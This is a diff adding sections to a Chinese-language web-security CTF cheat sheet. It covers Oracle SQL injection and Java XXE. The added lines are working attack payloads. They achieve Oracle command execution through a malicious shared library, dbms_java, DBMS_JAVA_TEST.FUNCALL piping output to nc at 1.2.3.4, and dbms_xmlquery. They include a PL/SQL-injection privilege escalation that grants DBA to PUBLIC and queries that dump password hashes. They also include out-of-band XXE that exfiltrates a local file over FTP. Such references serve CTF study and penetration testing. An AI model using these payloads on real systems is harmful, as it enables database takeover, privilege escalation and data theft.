@@ -1651,10 +1651,16 @@ PS1=$(cat flag)
         - database version
     - `SELECT host_name FROM v$instance;`
         - Name of the host machine
+    - `SELECT banner FROM v$version WHERE banner LIKE 'TNS%'`
+        - 作業系統版本
     - `utl_inaddr.get_host_address`
         - 本機IP
     - `select utl_inaddr.get_host_name('87.87.87.87') from dual`
         - IP反解
+    - `dba_tables`
+        - 系統所有表資訊，需要 dba 權限
+    - `user_tables`
+        - 當前使用者名下表的資訊
 - 庫名(schema)
     - `SELECT DISTINCT OWNER FROM ALL_TABLES`
 - 表名
@@ -1691,17 +1697,55 @@ PS1=$(cat flag)
     - `extractvalue()` XXE
         - `SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT xxxx)||'.oob.kaibro.tw/"> %remote;]>'),'/l') FROM dual`
         - 新版已 patch
-
 - users
     - `select username from all_users`
         - lists all users of the database
     - `select name, password from sys.user$`
     - `select username,password,account_status from dba_users`
+- Java source
+    - 可以創建 Java 源碼並存成 Oracle 物件
+    - `CREATE JAVA SOURCE NAMED "xxxx" AS <Java Code>`
+- Code execution
+    - load lib
+        - `create or replace library lib_evil as '/home/oracle/evil.so';`
+        - `create or replace function cmd(str varchar2) return varchar2 as language c library lib_evil name "cmd";`
+        - `select cmd('whoami') from dual;`
+    - `dbms_java.runjava`
+        - `dbms_java.runjava('com/sun/tools/script/shell/Main -e "var p = java.lang.Runtime.getRuntime().exec(''$cmd'');"')`
+    - `DBMS_JAVA_TEST.FUNCALL`
+        - `SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/usr/bin/bash','-c','/bin/ls|/usr/bin/nc 1.2.3.4 1234') FROM DUAL;`
+    - `DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES`
+        - 利用 PL/SQL Injection 提權
+        - 影響版本: Oracle 8.1.7.4, 9.2.0.1 - 9.2.0.7, 10.1.0.2 - 10.1.0.4, 10.2.0.1-10.2.0.2
+        ```sql
+        -- 提權
+        select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS _OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant dba to public'''';END;'';END;--','SYS',0,'1',0) from dual
+        -- 建立java command
+        select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace and compile java source named "Command" as import java.io.*;public class Command{public static String exec(String cmd) throws Exception{String sb="";BufferedInputStream in = new BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());BufferedReader inBr = new BufferedReader(new InputStreamReader(in));String lineStr;while ((lineStr = inBr.readLine()) != null)sb+=lineStr+"\n";inBr.close();in.close();return sb;}}'''';END;'';END;--','SYS',0,'1',0) from dual
+        -- 賦予java執行權限
+        select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission( ''''''''PUBLIC'''''''', ''''''''SYS:java.io.FilePermission'''''''', ''''''''<<ALL FILES>>'''''''', ''''''''execute'''''''' );end;'''';END;'';END;--','SYS',0,'1',0) from dual
+        -- 創建函數
+        select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''create or replace function cmd(p_cmd in varchar2) return varchar2 as language java name ''''''''Command.exec(java.lang.String) return String''''''''; '''';END;'';END;--','SYS',0,'1',0) from dual
+        -- 賦予函數執行權限
+        select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT" .PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant all on cmd to public'''';END;'';END;--','SYS',0,'1',0) from dual
+        -- 執行指令
+        select sys.cmd('cmd.exe /c whoami') from dual
+        ```
+    - `dbms_xmlquery.newcontext`
+        - 執行多語句
+        - 影響版本: oracle 10g, 11g 等，高版本已修復
+        ```sql
+        select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args) {try{BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;} catch (Exception e){return e.toString();}}}'';commit;end;') from dual;
 
+        select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name ''''LinxUtil.runCMD(java.lang.String) return String''''; '';commit;end;') from dual;
+
+        select OBJECT_ID from all_objects where object_name ='LINXRUNCMD';
+
+        select LINXRUNCMD('whoami') from dual;
+        ```
 - 特殊用法
     - `DBMS_XMLGEN.getXML('select user from dual')`
-    - `dbms_java.runjava('com/sun/tools/script/shell/Main -e "var p = java.lang.Runtime.getRuntime().exec(''$cmd'');"')`
-        - Java code execution
+
 ## SQLite
 
 - 子字串：
@@ -3471,6 +3515,38 @@ cdata.dtd:
 ```
 
 - Example: [Google CTF 2019 Qual - bnv](https://github.com/w181496/CTF/blob/master/googlectf-2019-qual/bnv/README_en.md)
+
+## Java XXE + FTP
+
+```xml
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE ANY [
+<!ENTITY % dtd PUBLIC "-//OXML/XXE/EN" "http://127.0.0.1:8080/ftp.dtd">
+        %dtd;%ftp;%send;
+        ]>
+<ANY>xxe</ANY>
+```
+
+ftp.dtd:
+
+```xml
+<!ENTITY % file SYSTEM "file:///flag">
+<!ENTITY % ftp "<!ENTITY &#37; send SYSTEM 'ftp://fakeuser:%file;@127.0.0.1:2121'>">
+```
+
+or
+
+```xml
+<!ENTITY % file SYSTEM "file:///flag">
+<!ENTITY % ftp "<!ENTITY &#37; send SYSTEM 'ftp://fakeuser:pass@127.0.0.1:2121/%file;'>">
+```
+
+正常 OOB XXE 遇到檔案內容有 `\n` 會爛
+
+但 Java 環境下，部分版本透過 FTP 不會被影響:
+- `<7u141-b00` or `<8u131-b09`: 不受檔案中 `\n` 的影響
+- `>jdk8u131`: 能建立 FTP 連線，外帶檔案內容中含 `\n` 則拋出異常
+- `>jdk8u232`: 不能建立 FTP 連線，若 url 中含有 `\n` 則抛出異常
 
 ## SOAP
 
